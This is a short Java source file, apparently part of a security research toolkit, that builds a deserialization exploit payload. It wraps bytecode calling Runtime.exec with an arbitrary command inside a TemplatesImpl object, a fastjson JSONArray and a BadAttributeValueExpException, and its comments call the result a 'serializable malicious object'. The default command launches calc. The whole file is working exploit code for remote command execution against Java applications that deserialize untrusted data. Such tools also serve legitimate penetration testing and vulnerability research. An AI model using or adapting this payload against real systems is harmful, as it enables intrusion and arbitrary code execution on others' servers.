package tools;

import com.alibaba.fastjson.JSONArray;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

public class PayloadGen {

    /**
     * 获取默认payload (执行calc)
     */
    public static Object getPayload() throws Exception {
        return getPayloadWithCommand("calc");
    }

    /**
     * 获取自定义命令的payload
     * @param command 要执行的命令
     * @return 可序列化的恶意对象
     */
    public static Object getPayloadWithCommand(String command) throws Exception {
        String code = "{\n" +
                "        Runtime.getRuntime().exec(\"" + command + "\");\n" +
                "    }";
        byte[] bytes = ClassByteGen.getBytes(code, "AAAAAA123");
        Templates templates = TemplatesGen.getTemplates(bytes, null);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bad = new BadAttributeValueExpException("aaa");
        ReflectTools.setFieldValue(bad, "val", jsonArray);

        return bad;
    }
}
